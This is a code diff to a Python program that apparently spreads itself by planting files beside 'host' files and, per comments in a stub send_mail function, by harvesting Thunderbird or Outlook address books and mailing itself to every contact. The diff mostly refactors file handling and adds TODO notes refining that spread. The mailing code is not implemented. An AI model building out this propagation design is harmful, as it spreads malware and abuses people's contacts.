@@ -115,9 +115,8 @@ def read_text_file_to_dict(filename):
               and the appropriate values being the content of this line (string values).
     """
     result = {}
-    file = open(filename, "r")
-    lines = file.readlines()
-    file.close()
+    with open(filename, "r") as file:
+        lines = file.readlines()
     
     # NOTE: The line indexing stars with 0.
     for i, line in zip(range(len(lines)), lines):
@@ -134,6 +133,8 @@ def shuffle_filename(filename):
     return filename
     
     
+# TODO: Sometimes (when applying more than one times to a nested directory), 
+# this function is appearantly called with n<=0 and empty docx files are generated!
 def n_rand_numbers(n):
     """
     :n: The length of the list to return.
@@ -177,10 +178,9 @@ def write_dict_to_text_file(dictionary, filename):
     :dictionary: the dictionary that should be written to a file.
     :filename: the name of the file that should be filled with dictionary's content.
     """
-    file = open(filename, "w")
-    for i in range(len(dictionary)):
-        file.writelines(dictionary[i])
-    file.close()
+    with open(filename, "w") as file:
+        for i in range(len(dictionary)):
+            file.writelines(dictionary[i])
     
     
 # TODO: Instead of writing the new files to the same directory as the "host" file, 
@@ -323,6 +323,7 @@ def send_mail():
     pass
     # If Mozilla Thunderbird is installed, read the whole address book from Thunderbird (SQLite database) and send this program to each address of the address book
     # If Outlook is installed, do the same for Outlook. This check only needs to be done if the operating system is Windows.
+    # TODO: Ensure that mails are not sent to the from address
 
 
 if __name__ == "__main__":
